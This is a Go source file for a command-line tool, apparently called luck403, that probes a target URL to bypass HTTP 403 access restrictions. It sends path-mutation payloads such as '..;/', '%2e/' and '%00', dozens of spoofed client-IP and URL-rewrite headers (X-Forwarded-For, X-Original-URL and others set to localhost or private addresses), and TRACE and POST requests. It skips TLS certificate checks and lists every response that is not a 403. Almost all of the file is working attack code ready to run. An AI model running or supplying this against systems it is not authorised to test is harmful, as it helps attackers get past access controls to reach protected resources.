package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

type requestResult struct {
	url     string
	method  string
	headers map[string]string
	status  int
	size    int
	err     error
}

func sendRequest(url, method string, headers map[string]string) requestResult {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略证书验证
		},
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return requestResult{url, method, headers, 0, 0, err}
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36")
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		if err, ok := err.(net.Error); ok && err.Timeout() {
			return requestResult{url, method, headers, 0, 0, fmt.Errorf("request timeout")}
		}
		return requestResult{url, method, headers, 0, 0, err}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return requestResult{url, method, headers, 0, 0, err}
	}

	size := len(body)
	if resp.Header.Get("Content-Length") != "" {
		size, _ = strconv.Atoi(resp.Header.Get("Content-Length"))
	}

	return requestResult{url, method, headers, resp.StatusCode, size, nil}
}

func main() {
	info := `============================================
 _     _     ____  _  __    _  ____ _____ 
/ \   / \ /\/   _\/ |/ //\ / |/  _ \\__  \
| |   | | |||  /  |   / \_\| || / \|  /  |
| |_/\| \_/||  \__|   \    | || \_/| _\  |
\____/\____/\____/\_|\_\   \_|\____//____/

 		  	By:Seven1an    v0.1
============================================`
	fmt.Println(info)

	urlPtr := flag.String("u", "", "Target URL")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Println("Usage: luck403.exe -u <url>")
		return
	}

	baseURL := *urlPtr

	// 自动补全 URL 末尾的 "/"
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	urls := []string{
		baseURL + "/",
		baseURL + "//",
		baseURL + "///",
		baseURL + "/.",
		baseURL + ".//./",
		baseURL + "/././",
		baseURL + "%2e/",
		baseURL + "..;/",
		baseURL + "/..;/",
		baseURL + "%20",
		baseURL + "%09",
		baseURL + "%00",
		baseURL + ".json",
		baseURL + ".js",
		baseURL + ".css",
		baseURL + ".html",
		baseURL + "?",
		baseURL + "??",
		baseURL + "???",
		baseURL + "?testparam",
		baseURL + "/?anything",
		baseURL + "#",
		baseURL + "#/",
		baseURL + "#test",
		baseURL + "/.",
		baseURL + ";",
		baseURL + ";/",
		baseURL + "/;../",
		baseURL + "*",
		baseURL + "/*",
	}

	var non403Results []requestResult // 存储非403的结果

	for _, url := range urls {
		result := sendRequest(url, "GET", nil)
		if result.err != nil {
			if result.err.Error() == "request timeout" {
				fmt.Println("request timeout")
			} else {
				fmt.Printf("Error for URL '%s': %s\n", result.url, result.err)
			}
			continue
		}

		headerInfo := ""
		for key, value := range result.headers {
			headerInfo += fmt.Sprintf("'%s': '%s', ", key, value)
		}
		headerInfo = strings.TrimSuffix(headerInfo, ", ")

		if len(result.headers) > 0 {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d Headers: { %s }\n",
				result.method, result.url, result.status, result.size, headerInfo))
		} else {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d\n",
				result.method, result.url, result.status, result.size))
		}


		if result.status != 403 {
			non403Results = append(non403Results, result)
		}

		time.Sleep(10 * time.Millisecond)
	}

	path := "/"
	if path != "/" && path[len(path)-1] == '/' {
		path = path[:len(path)-1]
	}

	headers := []map[string]string{
		{"X-Original-URL": path},
		{"X-Rewrite-URL": path},
		{"X-Custom-IP-Authorization": "localhost"},
		{"X-Custom-IP-Authorization": "localhost:80"},
		{"X-Custom-IP-Authorization": "localhost:443"},
		{"X-Custom-IP-Authorization": "127.0.0.1"},
		{"X-Custom-IP-Authorization": "127.0.0.1:80"},
		{"X-Custom-IP-Authorization": "127.0.0.1:443"},
		{"X-Custom-IP-Authorization": "2130706433"},
		{"X-Custom-IP-Authorization": "0x7F000001"},
		{"X-Custom-IP-Authorization": "0177.0000.0000.0001"},
		{"X-Custom-IP-Authorization": "0"},
		{"X-Custom-IP-Authorization": "127.1"},
		{"X-Custom-IP-Authorization": "10.0.0.0"},
		{"X-Custom-IP-Authorization": "10.0.0.1"},
		{"X-Custom-IP-Authorization": "172.16.0.0"},
		{"X-Custom-IP-Authorization": "172.16.0.1"},
		{"X-Custom-IP-Authorization": "192.168.1.0"},
		{"X-Custom-IP-Authorization": "192.168.1.1"},
		{"X-Forwarded-For": "localhost"},
		{"X-Forwarded-For": "localhost:80"},
		{"X-Forwarded-For": "localhost:443"},
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Forwarded-For": "127.0.0.1:80"},
		{"X-Forwarded-For": "127.0.0.1:443"},
		{"X-Forwarded-For": "2130706433"},
		{"X-Forwarded-For": "0x7F000001"},
		{"X-Forwarded-For": "0177.0000.0000.0001"},
		{"X-Forwarded-For": "0"},
		{"X-Forwarded-For": "127.1"},
		{"X-Forwarded-For": "10.0.0.0"},
		{"X-Forwarded-For": "10.0.0.1"},
		{"X-Forwarded-For": "172.16.0.0"},
		{"X-Forwarded-For": "172.16.0.1"},
		{"X-Forwarded-For": "192.168.1.0"},
		{"X-Forwarded-For": "192.168.1.1"},
		{"X-Forward-For": "localhost"},
		{"X-Forward-For": "localhost:80"},
		{"X-Forward-For": "localhost:443"},
		{"X-Forward-For": "127.0.0.1"},
		{"X-Forward-For": "127.0.0.1:80"},
		{"X-Forward-For": "127.0.0.1:443"},
		{"X-Forward-For": "2130706433"},
		{"X-Forward-For": "0x7F000001"},
		{"X-Forward-For": "0177.0000.0000.0001"},
		{"X-Forward-For": "0"},
		{"X-Forward-For": "127.1"},
		{"X-Forward-For": "10.0.0.0"},
		{"X-Forward-For": "10.0.0.1"},
		{"X-Forward-For": "172.16.0.0"},
		{"X-Forward-For": "172.16.0.1"},
		{"X-Forward-For": "192.168.1.0"},
		{"X-Forward-For": "192.168.1.1"},
		{"X-Remote-IP": "localhost"},
		{"X-Remote-IP": "localhost:80"},
		{"X-Remote-IP": "localhost:443"},
		{"X-Remote-IP": "127.0.0.1"},
		{"X-Remote-IP": "127.0.0.1:80"},
		{"X-Remote-IP": "127.0.0.1:443"},
		{"X-Remote-IP": "2130706433"},
		{"X-Remote-IP": "0x7F000001"},
		{"X-Remote-IP": "0177.0000.0000.0001"},
		{"X-Remote-IP": "0"},
		{"X-Remote-IP": "127.1"},
		{"X-Remote-IP": "10.0.0.0"},
		{"X-Remote-IP": "10.0.0.1"},
		{"X-Remote-IP": "172.16.0.0"},
		{"X-Remote-IP": "172.16.0.1"},
		{"X-Remote-IP": "192.168.1.0"},
		{"X-Remote-IP": "192.168.1.1"},
		{"X-Originating-IP": "localhost"},
		{"X-Originating-IP": "localhost:80"},
		{"X-Originating-IP": "localhost:443"},
		{"X-Originating-IP": "127.0.0.1"},
		{"X-Originating-IP": "127.0.0.1:80"},
		{"X-Originating-IP": "127.0.0.1:443"},
		{"X-Originating-IP": "2130706433"},
		{"X-Originating-IP": "0x7F000001"},
		{"X-Originating-IP": "0177.0000.0000.0001"},
		{"X-Originating-IP": "0"},
		{"X-Originating-IP": "127.1"},
		{"X-Originating-IP": "10.0.0.0"},
		{"X-Originating-IP": "10.0.0.1"},
		{"X-Originating-IP": "172.16.0.0"},
		{"X-Originating-IP": "172.16.0.1"},
		{"X-Originating-IP": "192.168.1.0"},
		{"X-Originating-IP": "192.168.1.1"},
		{"X-Remote-Addr": "localhost"},
		{"X-Remote-Addr": "localhost:80"},
		{"X-Remote-Addr": "localhost:443"},
		{"X-Remote-Addr": "127.0.0.1"},
		{"X-Remote-Addr": "127.0.0.1:80"},
		{"X-Remote-Addr": "127.0.0.1:443"},
		{"X-Remote-Addr": "2130706433"},
		{"X-Remote-Addr": "0x7F000001"},
		{"X-Remote-Addr": "0177.0000.0000.0001"},
		{"X-Remote-Addr": "0"},
		{"X-Remote-Addr": "127.1"},
		{"X-Remote-Addr": "10.0.0.0"},
		{"X-Remote-Addr": "10.0.0.1"},
		{"X-Remote-Addr": "172.16.0.0"},
		{"X-Remote-Addr": "172.16.0.1"},
		{"X-Remote-Addr": "192.168.1.0"},
		{"X-Remote-Addr": "192.168.1.1"},
		{"X-Client-IP": "localhost"},
		{"X-Client-IP": "localhost:80"},
		{"X-Client-IP": "localhost:443"},
		{"X-Client-IP": "127.0.0.1"},
		{"X-Client-IP": "127.0.0.1:80"},
		{"X-Client-IP": "127.0.0.1:443"},
		{"X-Client-IP": "2130706433"},
		{"X-Client-IP": "0x7F000001"},
		{"X-Client-IP": "0177.0000.0000.0001"},
		{"X-Client-IP": "0"},
		{"X-Client-IP": "127.1"},
		{"X-Client-IP": "10.0.0.0"},
		{"X-Client-IP": "10.0.0.1"},
		{"X-Client-IP": "172.16.0.0"},
		{"X-Client-IP": "172.16.0.1"},
		{"X-Client-IP": "192.168.1.0"},
		{"X-Client-IP": "192.168.1.1"},
		{"X-Real-IP": "localhost"},
		{"X-Real-IP": "localhost:80"},
		{"X-Real-IP": "localhost:443"},
		{"X-Real-IP": "127.0.0.1"},
		{"X-Real-IP": "127.0.0.1:80"},
		{"X-Real-IP": "127.0.0.1:443"},
		{"X-Real-IP": "2130706433"},
		{"X-Real-IP": "0x7F000001"},
		{"X-Real-IP": "0177.0000.0000.0001"},
		{"X-Real-IP": "0"},
		{"X-Real-IP": "127.1"},
		{"X-Real-IP": "10.0.0.0"},
		{"X-Real-IP": "10.0.0.1"},
		{"X-Real-IP": "172.16.0.0"},
		{"X-Real-IP": "172.16.0.1"},
		{"X-Real-IP": "192.168.1.0"},
		{"X-Real-IP": "192.168.1.1"},
		{"X-Host": "localhost"},
		{"X-Host": "localhost:80"},
		{"X-Host": "localhost:443"},
		{"X-Host": "127.0.0.1"},
		{"X-Host": "127.0.0.1:80"},
		{"X-Host": "127.0.0.1:443"},
		{"X-Host": "2130706433"},
		{"X-Host": "0x7F000001"},
		{"X-Host": "0177.0000.0000.0001"},
		{"X-Host": "0"},
		{"X-Host": "127.1"},
		{"X-Host": "10.0.0.0"},
		{"X-Host": "10.0.0.1"},
		{"X-Host": "172.16.0.0"},
		{"X-Host": "172.16.0.1"},
		{"X-Host": "192.168.1.0"},
		{"X-Host": "192.168.1.1"},
		{"X-Forwarded-Host": "localhost"},
		{"X-Forwarded-Host": "localhost:80"},
		{"X-Forwarded-Host": "localhost:443"},
		{"X-Forwarded-Host": "127.0.0.1"},
		{"X-Forwarded-Host": "127.0.0.1:80"},
		{"X-Forwarded-Host": "127.0.0.1:443"},
		{"X-Forwarded-Host": "2130706433"},
		{"X-Forwarded-Host": "0x7F000001"},
		{"X-Forwarded-Host": "0177.0000.0000.0001"},
		{"X-Forwarded-Host": "0"},
		{"X-Forwarded-Host": "127.1"},
		{"X-Forwarded-Host": "10.0.0.0"},
		{"X-Forwarded-Host": "10.0.0.1"},
		{"X-Forwarded-Host": "172.16.0.0"},
		{"X-Forwarded-Host": "172.16.0.1"},
		{"X-Forwarded-Host": "192.168.1.0"},
		{"X-Forwarded-Host": "192.168.1.1"},
		{"ticket": "1"},
		{"token1": "1"},
	}

	for _, header := range headers {
		result := sendRequest(baseURL, "GET", header)
		if result.err != nil {
			if result.err.Error() == "request timeout" {
				fmt.Println("request timeout")
			} else {
				fmt.Printf("Error for URL '%s': %s\n", result.url, result.err)
			}
			continue
		}

		headerInfo := ""
		for key, value := range result.headers {
			headerInfo += fmt.Sprintf("'%s': '%s', ", key, value)
		}
		headerInfo = strings.TrimSuffix(headerInfo, ", ")

		if len(result.headers) > 0 {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d Headers: { %s }\n",
				result.method, result.url, result.status, result.size, headerInfo))
		} else {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d\n",
				result.method, result.url, result.status, result.size))
		}

		if result.status != 403 {
			non403Results = append(non403Results, result)
		}

		time.Sleep(333 * time.Millisecond) // 在请求之间延迟333毫秒
	}

	result := sendRequest(baseURL, "TRACE", nil)
	if result.err != nil {
		if result.err.Error() == "request timeout" {
			fmt.Println("request timeout")
		} else {
			fmt.Printf("Error for URL '%s': %s\n", result.url, result.err)
		}
	} else {
		headerInfo := ""
		for key, value := range result.headers {
			headerInfo += fmt.Sprintf("'%s': '%s', ", key, value)
		}
		headerInfo = strings.TrimSuffix(headerInfo, ", ")

		if len(result.headers) > 0 {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d Headers: { %s }\n",
				result.method, result.url, result.status, result.size, headerInfo))
		} else {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d\n",
				result.method, result.url, result.status, result.size))
		}

		if result.status != 403 {
			non403Results = append(non403Results, result)
		}
		time.Sleep(1 * time.Second)
	}

	result = sendRequest(baseURL, "POST", nil)
	if result.err != nil {
		if result.err.Error() == "request timeout" {
			fmt.Println("request timeout")
		} else {
			fmt.Printf("Error for URL '%s': %s\n", result.url, result.err)
		}
	} else {

		headerInfo := ""
		for key, value := range result.headers {
			headerInfo += fmt.Sprintf("'%s': '%s', ", key, value)
		}
		headerInfo = strings.TrimSuffix(headerInfo, ", ")

		if len(result.headers) > 0 {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d Headers: { %s }\n",
				result.method, result.url, result.status, result.size, headerInfo))
		} else {
			color.Magenta(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d\n",
				result.method, result.url, result.status, result.size))
		}

		if result.status != 403 {
			non403Results = append(non403Results, result)
		}
	}
	if len(non403Results) <= 0 {
		fmt.Println("No requests were found except for 403")
	}

	if len(non403Results) > 0 {
		fmt.Println("Requests outside of 403:")
		for _, res := range non403Results {
			color.Green(fmt.Sprintf("%-5s ---> %-60s STATUS: %-4d SIZE: %-6d\n", res.method, res.url, res.status, res.size))
		}
	}
}
